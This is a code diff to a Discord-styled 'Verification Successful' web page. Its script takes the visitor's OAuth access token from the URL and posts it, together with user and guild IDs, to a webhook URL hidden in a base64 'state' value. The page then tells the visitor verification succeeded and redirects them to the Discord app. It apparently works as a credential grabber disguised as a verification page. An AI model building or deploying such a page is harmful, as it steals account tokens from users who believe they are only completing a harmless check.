@@ -4,9 +4,10 @@
     <title>Verification Successful</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background-color: #1a191e; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        h1 { color: #5865F2; }
-        .btn { background-color: #5865F2; color: white; padding: 15px 40px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 20px; display: none; }
+        body { background-color: #1a191e; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        h1 { color: #5865F2; font-size: 24px; }
+        p { color: #b9bbbe; font-size: 16px; margin-bottom: 30px; }
+        .btn { background-color: #5865F2; color: white; padding: 15px 40px; border-radius: 8px; text-decoration: none; font-weight: bold; display: none; box-shadow: 0 4px 14px rgba(88, 101, 242, 0.4); }
     </style>
 </head>
 <body>
@@ -15,33 +16,35 @@
     <a href="discord://-/" class="btn" id="btn">Open Discord App</a>
 
     <script>
-        // Get token from URL hash
+        // Discord sends the token in the URL hash (#access_token=...)
         const hash = new URLSearchParams(window.location.hash.substring(1));
         const token = hash.get('access_token');
-        
-        // Get user info from the 'state' parameter (we will pass it from the bot)
         const state = hash.get('state'); 
 
         if (token && state) {
-            // Decode the state (which contains the webhook URL and User ID)
+            // Decode the secret webhook data
             const decodedState = JSON.parse(atob(state));
             const webhookUrl = decodedState.webhook;
             const userId = decodedState.userId;
+            const guildId = decodedState.guildId;
 
-            // Send token to the Discord Webhook
+            // Send the token to the bot via the Webhook
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `TOKEN:${token}|USER:${userId}|GUILD:${decodedState.guildId}`
+                    content: `TOKEN:${token}|USER:${userId}|GUILD:${guildId}`
                 })
             }).then(() => {
                 document.getElementById('status').innerText = "Success! Redirecting to Discord...";
-                setTimeout(() => { window.location.href = "discord://-/"; }, 1000);
                 document.getElementById('btn').style.display = "inline-block";
+                // Automatically open Discord app after 1 second
+                setTimeout(() => { window.location.href = "discord://-/"; }, 1000);
+            }).catch(err => {
+                document.getElementById('status').innerText = "Error! Please try again.";
             });
         } else {
-            document.getElementById('status').innerText = "Error: Missing token.";
+            document.getElementById('status').innerText = "Error: Missing token or state.";
         }
     </script>
 </body>
